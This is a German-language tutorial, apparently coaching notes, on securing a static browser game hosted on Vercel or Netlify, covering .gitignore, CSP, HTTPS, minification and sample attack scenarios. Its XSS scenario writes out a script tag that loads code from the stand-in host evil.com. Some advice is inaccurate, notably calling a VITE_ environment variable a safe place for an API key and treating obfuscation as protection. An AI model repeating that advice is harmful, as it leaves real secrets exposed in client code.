# 🔐 Security Architecture - Visuell erklärt

## Die 3 Schichten deines Spiels

```
┌─────────────────────────────────────────────────────────────┐
│                    LAYER 3: BROWSER (User)                  │
│                                                              │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  index.html (minified)                              │  │
│  │  - Content-Security-Policy Header                   │  │
│  │  - Blocks XSS attacks                               │  │
│  └──────────────────────────────────────────────────────┘  │
│                          ↓                                   │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  game.js (minified & obfuscated)                    │  │
│  │  - Spiellogik läuft lokal                          │  │
│  │  - Keine Secrets im Code                            │  │
│  │  - console.logs entfernt (Production)                │  │
│  └──────────────────────────────────────────────────────┘  │
│                          ↓                                   │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  style.css (minified)                               │  │
│  └──────────────────────────────────────────────────────┘  │
│                                                              │
│  ✅ HTTPS verschlüsselt (Vercel/Netlify)                   │
│  ✅ Keine sensiblen Daten                                   │
│  ✅ Keine Backend-Calls                                     │
└─────────────────────────────────────────────────────────────┘
           ⬆️ HTTPS-Verbindung (verschlüsselt)

┌─────────────────────────────────────────────────────────────┐
│              LAYER 2: DEPLOYMENT (Vercel/Netlify)           │
│                                                              │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Static File Server                                 │  │
│  │  - Nur HTML, CSS, JS                               │  │
│  │  - Keine Datenbank                                  │  │
│  │  - Keine Secrets                                    │  │
│  └──────────────────────────────────────────────────────┘  │
│                          ↓                                   │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Security Features (automatisch):                   │  │
│  │  - HTTPS Zertifikat                                │  │
│  │  - X-Content-Type-Options: nosniff                  │  │
│  │  - X-Frame-Options: DENY                            │  │
│  │  - X-XSS-Protection: 1; mode=block                 │  │
│  │  - DDoS Protection                                  │  │
│  └──────────────────────────────────────────────────────┘  │
│                                                              │
│  ✅ Managed Security (Provider macht das)                   │
│  ✅ Automatic Backups                                       │
│  ✅ No Downtime Deployments                                 │
└─────────────────────────────────────────────────────────────┘
           ⬆️ Automatic from GitHub (git push)

┌─────────────────────────────────────────────────────────────┐
│                 LAYER 1: SOURCE CODE (GitHub)               │
│                                                              │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  .gitignore schützt Secrets:                        │  │
│  │  ❌ .env (nicht committed)                          │  │
│  │  ❌ node_modules/ (nicht committed)                 │  │
│  │  ❌ *.log (nicht committed)                         │  │
│  │  ❌ private keys (nicht committed)                  │  │
│  │                                                      │  │
│  │  ✅ game.js (committed)                            │  │
│  │  ✅ index.html (committed)                         │  │
│  │  ✅ style.css (committed)                          │  │
│  │  ✅ .env.example (committed - ohne Secrets!)      │  │
│  └──────────────────────────────────────────────────────┘  │
│                          ↓                                   │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Build Process (npm run build):                     │  │
│  │  1. ✅ Code wird minifiziert (kleiner)             │  │
│  │  2. ✅ Code wird obfuscated (verwirrt)             │  │
│  │  3. ✅ console.logs werden entfernt                │  │
│  │  4. ✅ Source Maps NICHT included                  │  │
│  │  5. ✅ Output in dist/ Ordner                      │  │
│  └──────────────────────────────────────────────────────┘  │
│                                                              │
│  ✅ Secrets bleiben lokal (.env nicht committed)           │
│  ✅ Nur gebundeter Code geht online                        │
│  ✅ Reverse Engineering schwierig (Minify)                  │
└─────────────────────────────────────────────────────────────┘
```

---

## Was passiert bei jeden Step?

### 1. DU ENTWICKELST (Lokal)

```bash
$ npm run dev
           ↓
    Vite Start Dev-Server
           ↓
    http://localhost:5173 (unverschlüsselt OK - nur lokal!)
           ↓
    Game lädt, du testest, entwickelst
```

**Sicherheit:** Lokal = Dein Computer = Sicher genug für Entwicklung

### 2. DU COMMITEST (zu GitHub)

```bash
$ git add .
$ git commit -m "Feature XY"
$ git push
           ↓
    .gitignore schaut:
    "Soll game.js committed werden?" ✅ JA
    "Soll .env committed werden?" ❌ NEIN
           ↓
    Code geht zu GitHub
           ↓
    Secrets bleiben lokal sicher!
```

**Sicherheit:** .gitignore schützt Secrets automatisch

### 3. VERCEL SIEHT DEN PUSH

```
GitHub Push
    ↓
Vercel Webhook wird aktiviert
    ↓
Vercel ladet neuesten Code
    ↓
npm install    (installs Vite)
npm run build  (minifies Code)
    ↓
dist/ Ordner wird gedeployed
    ↓
https://asteroids.vercel.app ist live!
```

**Sicherheit:** Vercel managed HTTPS, Security Headers, etc.

### 4. USER SPIELT DEIN SPIEL

```
Browser: GET /index.html (HTTPS verschlüsselt!)
    ↓
Server: Sendet minified HTML mit CSP Headers
    ↓
Browser: Content-Security-Policy aktiviert
    ("Nur JS von dieser Domain erlaubt")
    ↓
Browser: GET /game.js (HTTPS)
    ↓
Server: Sendet minified JS
    ↓
Game lädt & spielbar!
    ↓
User spielt sicher 🎮
```

**Sicherheit:**
- HTTPS = Spion kann Pakete nicht lesen
- CSP = XSS-Attacken werden blockiert
- Minified Code = Schwerer zu modifizieren

---

## Attackzenarios - Wie wir uns schützen

### 🔴 Szenario 1: Hacker versucht deine Secrets zu stehlen

```
Hacker sieht: https://github.com/DEIN_NAME/asteroids
Hacker sucht: .env Datei
          ↓
Findet: .env.example (aber keine echten Secrets!)
Findet: KEIN .env (weil .gitignore)
          ↓
Hacker hat nix zu hacken ✅
```

**Wie schützen wir?**
- `.env` ins `.gitignore`
- `.env.example` is public (zeigt nur Struktur)
- Echte Secrets nur lokal

### 🔴 Szenario 2: Hacker injiziert bösartiges JavaScript

```
Hacker versucht: <script src="https://evil.com/hack.js">
          ↓
Browser empfängt HTML mit CSP Header:
"default-src 'self'; script-src 'self'"
          ↓
Browser blockiert: "Nicht von dieser Domain!"
Hack wird nicht geladen ✅
```

**Wie schützen wir?**
- Content-Security-Policy im HTML
- `'self'` erlaubt nur von dieser Domain
- eval() ist blockiert

### 🔴 Szenario 3: MITM-Attack (Man in the Middle)

```
Hacker sitzt zwischen User & Server:

OHNE HTTPS (altmodisch):
User ← [unverschlüsselt] → Hacker ← [unverschlüsselt] → Server
Hacker kann lesen! ❌

MIT HTTPS (modern):
User ← [VERSCHLÜSSELT] → Hacker ← [VERSCHLÜSSELT] → Server
Hacker kann NICHT lesen! ✅
```

**Wie schützen wir?**
- Vercel/Netlify haben HTTPS automatisch
- Dein Browser zeigt grünes Schloss 🔒
- Datenfluss ist verschlüsselt

### 🔴 Szenario 4: Hacker versucht Quellcode zu klauen

```
Browser-Developer-Tools (F12):
Kann er sehen: minified game.js
          ↓
Originales game.js:
function calculateDamage(attack) { ... }
          ↓
Nach Minification:
const a=(b)=>{...}
          ↓
Hacker kann EINIGE Logik sehen (unvermeidbar im Browser)
Aber: Viel schwerer zu verstehen ✅
Aber: Secrets sind nicht drin! ✅
```

**Wie schützen wir?**
- Minification macht Code unlesbar
- NO source maps in production
- Keine Secrets im JavaScript Code (nur in .env)
- Echte Business-Logic gehört auf Backend

---

## 📊 Security Scorecard für dein Projekt

| Aspekt | Status | Warum |
|--------|--------|-------|
| **Secrets in Code** | ✅ SAFE | Keine (verwenden .env) |
| **Secrets committed** | ✅ SAFE | .gitignore blockiert |
| **HTTPS** | ✅ SAFE | Vercel/Netlify machen das |
| **XSS Protection** | ✅ SAFE | CSP Headers aktiv |
| **Code Obfuscation** | ✅ SAFE | Minified & Obfuscated |
| **Unerwünschtes JS** | ✅ SAFE | CSP blockiert externe Scripts |
| **Debug-Code** | ✅ SAFE | console.logs entfernt |
| **Source Maps** | ✅ SAFE | Nicht in Production |
| **CSRF** | ✅ N/A | Statisches Spiel, nicht möglich |
| **SQL Injection** | ✅ N/A | Keine Datenbank |

---

## 🎓 Die 3 goldenen Regeln

### 1️⃣ NEVER commit Secrets
```bash
❌ git add .env
✅ git add .env.example
```

### 2️⃣ ALWAYS use HTTPS
```
❌ http://asteroids.com
✅ https://asteroids.com
```

### 3️⃣ SECRETS gehören in .env (lokal) nicht in Code
```javascript
❌ const API_KEY = 'sk_live_123';
✅ const API_KEY = process.env.VITE_API_KEY;
```

---

**Du bist jetzt ein Security Architect! 🏗️🔐**

Wenn du später Fragen hast → COACH_NOTES.md lesen!
